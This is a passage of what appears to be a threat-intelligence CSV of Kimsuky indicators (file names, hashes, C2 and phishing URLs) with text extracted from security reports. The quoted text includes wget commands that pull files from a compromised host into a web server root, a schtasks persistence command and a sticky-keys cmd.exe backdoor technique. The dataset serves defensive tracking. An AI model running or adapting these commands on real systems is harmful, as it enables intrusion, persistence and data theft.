the",
1.0.0,actor--kimsuky,artifact--sha256:891bf9fe5edccfabf73a6f56dd4574e6e90db9f46c5f2dc12248d37a6972b4c7,observation--sha256:9f9d4006c754bb84aa737601ff4b801f3d7c323b6ea4a56a41cf62e2c50c99f5,file-name,Driverdriver.cfg,Driverdriver.cfg,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:891bf9fe5edccfabf73a6f56dd4574e6e90db9f46c5f2dc12248d37a6972b4c7,observation--sha256:d3704ec74f0db485bd0c8254931e6865291a82336447115fe4679b3b537e4da2,file-name,Driverdriver.cfg,Driverdriver.cfg,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:698079a5839e0719f7d2f51249d74e2a4d3c2310cb731e553b2d69588d53143c,observation--sha256:69cbcd78c9b775ff55c4331c2a520c1c5c4420a16ba20055afe2b34a578aed43,file-name,EaseOfAccessDialog.exe,EaseOfAccessDialog.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The types of virtual channels are as follows. Right picture of (Figure 9) ÿ rdpdr: File system extension. Access from server to client file system (Table 2) Condition comparison code of r_sethc_x64.exe To activate the sticky key function, press the Shift key five times in succession and the sticky key window will appear as shown below (Figure 10), which is handled by sethc.exe. However, if cmd.exe is copied to secthc.exe, cmd.exe can be executed by pressing the Shift key five times in a row, so ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b761bc2d20aad817c58e4e92f7ee13cbedd89a6a3338367464864349c87b6c63,observation--sha256:ec1dd4655f2f13dbb5ca41d4584d5bdd166f269ba28c0247ecb153d6ffd12aa3,file-name,Ersrr0.hta,Ersrr0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
1.0.0,actor--kimsuky,artifact--sha256:0a3a34bbd9bc1f05546c7dcd213273287f845e3586b7287a842046f8d8b8bb55,observation--sha256:fc82650671bcff23f50610fe0e0549174b3f4ccf1b588b30b7bd882e0380bb77,file-name,F000001094.pdf,F000001094.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 58}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"There is an awkward phrase in the form of a question : “Do you need help?” And since you will never enter your Daum ID and password to check the delivery document, if you pay attention and check when you receive a phishing email similar to this, you may find awkward phrases or parts that do not match the content of the email, so you can prevent damage. . [+] FedEx Phishing C2: hxxps://elated-blackburn.5-252-21-33.plesk.page/fededmd/fdx.php 58 ÿ FedEx Phishing Phishing pages impersonating famous ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:cdd38bc4dce928c49871e53e10add37e96e6cab4f5931965019d4fb680ac400f,observation--sha256:4526d8ef4c861f7a41d231f9283fd67ca7423d9fa863680161a2ab53b76c2d9c,file-name,Fmaov0.hta,Fmaov0.hta,candidate,2019-02-22T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 21}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,MD5 4118b251c977a682ebb4993601b9a7e3 File Name Schedule_.doc Last Modified Date (KST) 2019-02-22 17:09 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 29fbf69e72c0daac57d2cbba11bbfaa5 File Name xCryptoCrash_Schedule.doc Last Modified Date (KST) 2019-02-25 02:26 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 397ba1d0601558dfe34cd5aafaedd18e File Name white_paper.doc Last Modified Date (KST) 2019-02-26 15:40 Last Modified Name JamFedura C2 h,
1.0.0,actor--kimsuky,artifact--sha256:fffcd4f7b78864da0672c4f05c9b54fe0a0eba3197ced90016dababd058f1600,observation--sha256:86f72507a9e0517609f8e7408b0f3fa53d90f81509f456a4291ec0a8b3b4b298,file-name,Fwvuj0.hta,Fwvuj0.hta,candidate,2019-02-14T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 20}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[그림 9-1] Document created by 'John Harvey' is modified by 'windowsmb' File Name OFT.docm Last Modified Date (KST) 2019-02-14 23:08 Last Modified Name JamFedura C2 http://192.186.142[.]74/cache/Fwvuj0.hta MD5 304d86463a1fff5183aacc17ef2b3730 File Name bot spec.docm Last Modified Date (KST) 2019-02-18 17:30 Last Modified Name JamFedura C2 http://192.186.142[.]74/mn/Xtgnb0.hta MD5 f816a9c4a3415e8bae807c09e0f80b38 File Name white_paper.doc Last Modified Date (KST) 2019-02-19 17:29 Last Modified Name,
1.0.0,actor--kimsuky,artifact--sha256:7abc03f4a58a59a17b60ec778b797ffb7c75b5699826011c2769a14609039585,observation--sha256:3a1ac58807f8302eb882915d4ebb0a9c6dd1b9885825636822b8f5127154569d,file-name,GetSync.exe,GetSync.exe,candidate,2018-07-15T00:00:00Z,day,known,same-record,2019-02-01T00:00:00Z,source--babyshark-xlsx,baby-kimsuky/BabyShark Rule - Mal Cert and others.xlsx,"{""row"": 14, ""sheet"": ""check-results_Venom23-155099628""}",[],"[""malware--babyshark""]",[],"[""payload""]",0,false,high,TLP:CLEAR,xlsx-row,"adfd949ac91187061b44d8c8415ec5003d26164ff57d6c47e4ecaf8c9b80795f malicious MAL_PE_Type_BabyShark_Loader 33 Microsoft: Trojan:Win32/Stolpen.A / Kaspersky: Trojan-Banker.Win32.ClipBanker.ba / McAfee: Trojan-StolenPen / CrowdStrike: malicious_confidence_100% (W) / ESET-NOD32: Win64/Spy.Sysnokki.B / Symantec: Trojan Horse / Sophos: Mal/Generic-S / GData: Trojan.GenericKD.31407858 GetSync.exe, GetSync, apach_x64.exe 2018-07-15 04:24:34 UTC ( 7 months, 2 weeks ago ) 2019-02-15 04:24:58 Win32 EXE 9d1e1",
1.0.0,actor--kimsuky,artifact--sha256:7abc03f4a58a59a17b60ec778b797ffb7c75b5699826011c2769a14609039585,observation--sha256:1fc39f7e5c3a8c6270e7119bf84e9ba24938c221a1ca4540a2c4892f3082584d,file-name,GetSync.exe,GetSync.exe,candidate,2018-07-15T00:00:00Z,day,known,same-record,2019-02-01T00:00:00Z,source--babyshark-xlsx,baby-kimsuky/BabyShark Rule - Mal Cert and others.xlsx,"{""row"": 4, ""sheet"": ""check-results_Venom23-155099628""}",[],"[""malware--babyshark""]",[],"[""payload""]",0,false,high,TLP:CLEAR,xlsx-row,"4dcd46e838bb7a764bc35b4e4a3a2e693fedcda5334d54b982bea29b5f4887a3 malicious MAL_PE_Type_BabyShark_Loader 39 Microsoft: Trojan:Win32/Stolpen.A / Kaspersky: Trojan-Banker.Win32.ClipBanker.ai / McAfee: RDN/Generic PWS.y / CrowdStrike: malicious_confidence_100% (W) / ESET-NOD32: a variant of Win32/Spy.Sysnokki.C / Symantec: Trojan Horse / Sophos: Mal/Generic-S / GData: Trojan.Generic.23083176 GetSync.exe, GetSync, apach_x86.exe 2018-07-15 04:24:36 UTC ( 7 months, 2 weeks ago ) 2019-02-14 03:46:06 Win",
1.0.0,actor--kimsuky,artifact--sha256:5daa6f5015ec5c88c8735a646e46cfdce85400f2adee547bb5c6b5341a0b4e7a,observation--sha256:d461d4e66b48be71e69bd81f7056b28bf193ba79807ceb77cafacff2a70480f4,file-name,Gu8x7s78gsx6.php,Gu8x7s78gsx6.php,candidate,2023-03-22T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,27.255.80.170(KR) 6 GuestUser 2023-03-22 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsxueidj6.php 09:09:55 Operation Covert Stalker Report 2023-04-11 54 hxxp://www.bluemotion.co.kr/cheditor 4/ insert_link.php 27.255.75.137(KR) hxxps://usesignal.info/tygygvftsfx8g68 Gu8x7s78gsx6.php 10 16:44:22 74.119.239.234(US) 27.255.80.170(KR) 5 222.102.7.13(KR) 12 74.119.239.234(US) GuestUser hxxps://extparts.info/tygygvftsfx8g68G u8x7s78gsx6.php 16:43:53 2023-04-01 9 09:12:21 27.255.75.137(KR) 2023-04-,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:48f03303a5c92b0fbbcd9ae02e5b64ecb62505d665a9132014c0111d9de6f6ec,observation--sha256:de4cd8b775bb7c8d87096f390795337fac9d9084192f5353d90f3363a33f8844,file-name,Gu8x7s78gsx6519.php,Gu8x7s78gsx6519.php,candidate,2023-03-22T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,27.255.80.170(KR) 6 GuestUser 2023-03-22 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsxueidj6.php 09:09:55 Operation Covert Stalker Report 2023-04-11 54 hxxp://www.bluemotion.co.kr/cheditor 4/ insert_link.php 27.255.75.137(KR) hxxps://usesignal.info/tygygvftsfx8g68 Gu8x7s78gsx6.php 10 16:44:22 74.119.239.234(US) 27.255.80.170(KR) 5 222.102.7.13(KR) 12 74.119.239.234(US) GuestUser hxxps://extparts.info/tygygvftsfx8g68G u8x7s78gsx6.php 16:43:53 2023-04-01 9 09:12:21 27.255.75.137(KR) 2023-04-,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:947dde8fe7040e95343536ce9b107ae557fb8bc0256476d717eeda28a889f7fd,observation--sha256:4ab06b25124e1e13dee26e6d5663a591f98d847854c5ef363fea7e00ac06ce1b,file-name,Gu8x7s78gsxueidj6.php,Gu8x7s78gsxueidj6.php,candidate,2023-03-22T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,27.255.80.170(KR) 6 GuestUser 2023-03-22 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsxueidj6.php 09:09:55 Operation Covert Stalker Report 2023-04-11 54 hxxp://www.bluemotion.co.kr/cheditor 4/ insert_link.php 27.255.75.137(KR) hxxps://usesignal.info/tygygvftsfx8g68 Gu8x7s78gsx6.php 10 16:44:22 74.119.239.234(US) 27.255.80.170(KR) 5 222.102.7.13(KR) 12 74.119.239.234(US) GuestUser hxxps://extparts.info/tygygvftsfx8g68G u8x7s78gsx6.php 16:43:53 2023-04-01 9 09:12:21 27.255.75.137(KR) 2023-04-,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:19d3755942bc08427533e089ac20bd9c750e942ccdd2dc9ef66e32c97c283349,observation--sha256:213013cc3473ac3b60b77d24db71b2b75ef09e50813836af1f7cec2d1ef6fd0e,file-name,Guide.chmasset.chmwages.chm,Guide.chmasset.chmwages.chm,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:b95bf8a0a4c39f42d70c687841dc3b7bb340b4995902a41d9b104aa24fb2c468,observation--sha256:f125171f6414fdd6dcb810e694bf20f5c266a791d67776e3a1e2f03ae1d9521a,file-name,HH.exe,HH.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a774ed9f7821fa9e6916a5705ce1d033f67b453fb7facf6509b7ac3c1e10ae92,observation--sha256:3785a9cc11787946700ae8ceba561db6ebe20fcf8944d9ec41fbdd574803631b,file-name,HeidiSQL_11.1_64_Portable.zip,HeidiSQL_11.1_64_Portable.zip,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:7b3617a9e075bad59b146feeecd6ed118cc2de079245a5babe6790be01d4aea4,observation--sha256:4ec1924a4454f78fcb5be01efdcbe91134045b1bed31f2ea3a777387d018471c,file-name,Htqgf0.hta,Htqgf0.hta,candidate,2019-03-21T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 19}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last Modified Date (KST) 2019-03-21 17:42 Last Modified Name windowsmb C2 https://login-main.bigwnet[.]com/attachment/view/Msgxo0.hta MD5 7ca1a603a7440f1031c666afbe44afc8 File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last Modified Date (KST) 2019-03-26 09:45 Last Modified Name windowsmb C2 n/a MD5 60973af3b8ecbbb0ab659124409b7df1 File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last,
1.0.0,actor--kimsuky,artifact--sha256:7b3617a9e075bad59b146feeecd6ed118cc2de079245a5babe6790be01d4aea4,observation--sha256:2166a0aec8ea0d5bfdc83d207120bb8d0a1bdbc76dde19311898839710060e58,file-name,Htqgf0.hta,Htqgf0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 8}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 2] Screen displayed after executing the malicious document written in Korean The malicious document contains files range from 'activeX1.bin' to 'activeX10.bin'. The file 'activeX2.bin' is the one that has the communication host addresses as follows, and it tries the additional C2 communication by means of HTA commands and conditions. - https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/Htqgf0.hta - https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/expres.php?op=1 - https://t",
1.0.0,actor--kimsuky,artifact--sha256:46a3a3bcadc3706420b7a9f29fb8b90581062bd276781c2c982d36f3aea78978,observation--sha256:8ee6e99d82ba475b7d1904a8387362b99fb3ab0d4b91013954ea04d92dc16c49,file-name,Index.php,Index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--24447f44f83f408c,kimsuky/2024-05-28-kimsuky-webshell.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,페이지 9 / 9 하우리 악성코드 상세 분석 보고서 IOC Index.php - C456E2E0C015A4D3FEE7E17B7229B9AA myid.php - 5BFA4D6D14C5BAF5AD3DB44BC58CFEE4 hxxp://dgms.or.kr/inc/bottom/fowrkl hxxp://dgms.or.kr/inc/bottom/myid.php hxxp://www.lkh.co.kr/eng/data/ncdos hxxp://www.lkh.co.kr/eng/data/myid.php,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:13a17978c6df6ca230981dd82fd207a5c33b9530439eb98b58799d6814e13ce7,observation--sha256:43bef098a5c3ee16b6e36c2da122fa721d6707dfd541ff7cb74b3635178f837a,file-name,Items.php,Items.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ www.bluemotion.co.kr/cheditor4/insert_link.php ÿ www.scabm.co.kr/gnuboard4/bbs/view_coma.php ÿ kakaoreug.info/tygygvftsfx8g68Gu8x7s78gsvseidj6.php ÿ bstill.kr/gnuboard4/bbs/view_coma.php 12 ÿ afgvillage.eu/tygygvftsfx8g68Gu8x7s78gsx6.php ÿ listmember.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ kakaocore.eu/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ www.mykoces.com/gnuboard4/bbs/view_coma.php ÿ e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:13a17978c6df6ca230981dd82fd207a5c33b9530439eb98b58799d6814e13ce7,observation--sha256:bb499593e76451b18125330a0c17ebb16511081a3f6f4fe542ed97a9fbb8d572,file-name,Items.php,Items.php,candidate,2023-03-22T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,27.255.80.170(KR) 6 GuestUser 2023-03-22 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsxueidj6.php 09:09:55 Operation Covert Stalker Report 2023-04-11 54 hxxp://www.bluemotion.co.kr/cheditor 4/ insert_link.php 27.255.75.137(KR) hxxps://usesignal.info/tygygvftsfx8g68 Gu8x7s78gsx6.php 10 16:44:22 74.119.239.234(US) 27.255.80.170(KR) 5 222.102.7.13(KR) 12 74.119.239.234(US) GuestUser hxxps://extparts.info/tygygvftsfx8g68G u8x7s78gsx6.php 16:43:53 2023-04-01 9 09:12:21 27.255.75.137(KR) 2023-04-,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:910e96f944257850904c5487e60cf9bed04ea2f126963c973c6ff12c2c6d6842,observation--sha256:43cabf093f6e4480c380635f83bb7c95d74613a20dbaff115ab9315e49c001e9,file-name,KGH_Browser-Master.pdb,KGH_Browser-Master.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 13}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[20] . 窃取的部分信息 四、关联分析 Kimsuky 使用的 KGH 间谍组件非常有特点，该间谍组件曾被国外安全机构披露。 在以往的攻击活动中该组件曾携带 Pdb 路径“E:\SPY\WebBrowser\KGH_Browser-Master \x64\Release\KGH_Browser-Master.pdb”，这也是 KGH 名称的来由。在本次所分析的间 谍模块的新版本中，虽然攻击者删除了 Pdb 路径信息，但从反汇编代码层面看与旧版本 K GH 间谍组件存在高度一致性。 在之前的攻击活动中，KGH 间谍组件多以模块化的方式呈现，通常需要配合其他模块 进行攻击，例如在单独的模块中实现窃密功能，而开发者在新版本中拓展了 KGH 间谍组件 的功能，包括持久化、远程控制等，且使用 FTP 协议与 C2 通信，使之成为可以独立运行 的模块。 图[21] .基本一致的窃密执行流程（左为旧版，右为新版）,
1.0.0,actor--kimsuky,artifact--sha256:034c164dfe271aed902c94603ef608d5455659ddadbfac6734a19c1f2083354d,observation--sha256:aa354a3a4a5dc6b7e743d01c49f5b53a492dafbd36a969aaff61c90e0272df00,file-name,KPortScan3.exe,KPortScan3.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:034c164dfe271aed902c94603ef608d5455659ddadbfac6734a19c1f2083354d,observation--sha256:1dc01e689c85a35825786fa875758dc5e959e48940b3a2765056b644108efa85,file-name,(KPortScan3.exe,KPortScan3.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Vulnerability scanning is also possible. rdpv.exe (Remote Administration Tool) (Table 5) Exploited public programs Since communication with the internal system is impossible in the usage environment without going through a router, vulnerability scanning is also impossible. Remote management program official site: hxxps://www.ammyy.com/en/ Extract RDP account information remote management program RDP Wrapper explanation Additionally, exploiting publicly available programs can make it difficult fo",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:034c164dfe271aed902c94603ef608d5455659ddadbfac6734a19c1f2083354d,observation--sha256:997831e914902561d98e918f302c37b74bc03653379840627adcb7501f3df400,file-name,KPortScan3.exe,KPortScan3.exe,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:034c164dfe271aed902c94603ef608d5455659ddadbfac6734a19c1f2083354d,observation--sha256:517bdb30e61d687d4ee798e9e82185bbeca034dd16bbf191520a137b014e9e85,file-name,KPortScan3.exe,KPortScan3.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:201a9068543b10bab6e45e08f5f379289ff4c4c582ef2e291ac1509334635a09,observation--sha256:5b0ea136e04aa8fd4f4af370fcc36137274420a3e010e706142ad0fe4a19d851,file-name,Korea.pdf,Korea.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 62}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Bait file name National Assembly Legislative Research Service Advisory Request.docx Data URL Bait file name Analysis of North Korea’s foreign currency acquisition channels and measures to improve the effectiveness of sanctions against North Korea.pdf URL hxxps://attach.mail.daum.net/bigfile/v1/urls/d/JClVvbVCUf8Hfp Z-7_-A2w8PqyU/ JKH7ptbHMvh7XOnhrJ7UlQ (expired) Phishing URL 1 ****Institute, ******ng (***, former Minister of **) hacking target **University, ***kim*** (**, Professor) Phishing URL",Actor-directory corpus sweep; ambiguous values remain candidates.
